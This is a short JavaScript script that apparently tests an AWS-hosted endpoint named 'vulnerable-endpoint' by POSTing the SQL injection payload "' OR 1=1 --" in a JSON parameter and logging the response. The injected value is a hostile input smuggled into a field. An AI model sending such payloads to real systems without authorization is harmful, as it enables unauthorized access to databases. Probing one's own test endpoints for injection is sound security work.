async function testVulnerableEndpoint() {
  try {
    const response = await fetch('https://vindk0gyuh.execute-api.us-east-1.amazonaws.com/prod/vulnerable-endpoint', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ param: "' OR 1=1 --" })
    });

    console.log("Status:", response.status);

    // Wait for the response body and log it
    const data = await response.text();
    console.log("Response Data:", data);

    // Optionally, assert or check the response for specific test conditions
    if (response.ok) {
      console.log("Request was successful");
    } else {
      console.error("Request failed");
    }
  } catch (error) {
    console.error('Error:', error);
  }
}

testVulnerableEndpoint();
